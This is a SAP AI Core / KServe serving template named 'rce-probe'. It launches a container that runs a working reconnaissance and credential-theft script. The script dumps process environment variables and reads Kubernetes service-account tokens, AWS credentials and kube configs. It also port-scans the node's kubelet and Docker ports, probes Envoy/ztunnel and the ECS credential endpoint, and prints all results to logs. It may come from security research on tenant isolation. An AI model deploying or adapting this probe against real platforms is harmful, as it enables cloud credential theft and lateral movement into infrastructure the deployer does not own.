apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "node-creds-envoy-ztunnel-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, struct, glob, ssl

            print('[PROBE_V4_START]', flush=True)

            # --- 1. PID 1 environ (may differ from our process) ---
            try:
                with open('/proc/1/environ', 'rb') as f:
                    env1 = f.read().decode(errors='replace').replace('\x00', '\n')
                print('[PROC1_ENV]', env1[:3000], flush=True)
            except Exception as e:
                print('[PROC1_ENV_ERR]', e, flush=True)

            # --- 2. Local TCP listeners (/proc/net/tcp + tcp6) ---
            for netf in ['/proc/net/tcp', '/proc/net/tcp6']:
                try:
                    with open(netf) as f:
                        print(f'[{netf}]', f.read()[:1500], flush=True)
                except Exception as e:
                    print(f'[{netf}_ERR]', e, flush=True)

            # --- 3. Unix domain sockets ---
            try:
                with open('/proc/net/unix') as f:
                    print('[UNIX_SOCKETS]', f.read()[:2000], flush=True)
            except Exception as e:
                print('[UNIX_ERR]', e, flush=True)

            # --- 4. Node IP via default gateway ---
            node_ip = None
            try:
                with open('/proc/net/route') as f:
                    for line in f.readlines()[1:]:
                        fields = line.strip().split()
                        if len(fields) >= 3 and fields[1] == '00000000':
                            gw = fields[2]
                            node_ip = '.'.join(str(int(gw[i:i+2], 16)) for i in [6,4,2,0])
                            print('[NODE_GW]', node_ip, flush=True)
                            break
            except Exception as e:
                print('[NODE_GW_ERR]', e, flush=True)

            try:
                with open('/proc/net/arp') as f:
                    print('[ARP]', f.read()[:600], flush=True)
            except Exception as e:
                print('[ARP_ERR]', e, flush=True)

            # --- 5. Node port scan ---
            def tcp_probe(host, port, send=b'GET / HTTP/1.0\r\nHost: x\r\n\r\n', tls=False):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((host, port))
                    if tls:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    if send:
                        s.sendall(send)
                    resp = b''
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        resp += chunk
                        if len(resp) > 4000: break
                    s.close()
                    return 'OPEN', resp.decode(errors='replace')[:600]
                except ConnectionRefusedError:
                    return 'REFUSED', ''
                except Exception as ex:
                    return 'ERR', str(ex)[:100]

            if node_ip:
                for port, use_tls in [(10255, False), (10250, True), (10256, False), (4194, False), (2376, False)]:
                    status, body = tcp_probe(node_ip, port, tls=use_tls)
                    print(f'[NODE:{node_ip}:{port}] {status} | {body[:400]}', flush=True)

            # --- 6. Localhost Envoy / ztunnel ports ---
            for port in [15000, 15001, 15004, 15006, 15020, 15021, 15053, 15090]:
                status, body = tcp_probe('127.0.0.1', port)
                print(f'[LOCAL:{port}] {status} | {body[:400]}', flush=True)

            # --- 7. ECS-style credentials endpoint (169.254.170.2) ---
            ecs_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI', '')
            rel_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', '')
            if rel_uri:
                ecs_uri = 'http://169.254.170.2' + rel_uri
            print('[ECS_URI]', ecs_uri or '(not set)', flush=True)
            status, body = tcp_probe('169.254.170.2', 80)
            print('[ECS_META:169.254.170.2:80]', status, body[:300], flush=True)

            # --- 8. Filesystem credential hunt ---
            paths = [
                '/var/run/secrets/kubernetes.io/serviceaccount/token',
                '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
                '/var/run/secrets/eks.amazonaws.com/serviceaccount/token',
                '/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/token',
                '/var/run/secrets/token',
                '/run/secrets/',
                '/secrets/',
                '/var/run/secrets/sap.com/',
                '/etc/sap/',
                '/etc/ai-core/',
                '/etc/aicore/',
                '/var/run/sap/',
                '/root/.aws/credentials',
                '/.aws/credentials',
                '/root/.kube/config',
                '/.kube/config',
                '/var/lib/cloud/instance/user-data.txt',
                '/run/cloud-init/',
                '/etc/cloud/',
            ]
            for p in paths:
                try:
                    if os.path.isdir(p):
                        print(f'[DIR:{p}]', sorted(os.listdir(p)), flush=True)
                    elif os.path.isfile(p):
                        with open(p, 'rb') as fh:
                            print(f'[FILE:{p}]', fh.read(600).decode(errors='replace'), flush=True)
                except Exception as e:
                    print(f'[PATH_ERR:{p}]', str(e)[:60], flush=True)

            for pattern in ['/var/run/secrets/**', '/run/secrets/**']:
                try:
                    hits = glob.glob(pattern, recursive=True)
                    if hits:
                        print(f'[GLOB:{pattern}]', hits, flush=True)
                except: pass

            # --- 9. /etc/hosts, /etc/resolv.conf, /proc/self/cgroup ---
            for f in ['/etc/hosts', '/etc/resolv.conf', '/proc/self/cgroup', '/proc/1/cgroup']:
                try:
                    with open(f) as fh:
                        print(f'[{f}]', fh.read()[:500], flush=True)
                except Exception as e:
                    print(f'[{f}_ERR]', e, flush=True)

            # --- 10. Check full /proc/self/environ for anything missed ---
            try:
                with open('/proc/self/environ', 'rb') as fh:
                    env_self = fh.read().decode(errors='replace').replace('\x00', '\n')
                print('[SELF_ENV]', env_self[:3000], flush=True)
            except Exception as e:
                print('[SELF_ENV_ERR]', e, flush=True)

            print('[PROBE_V4_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
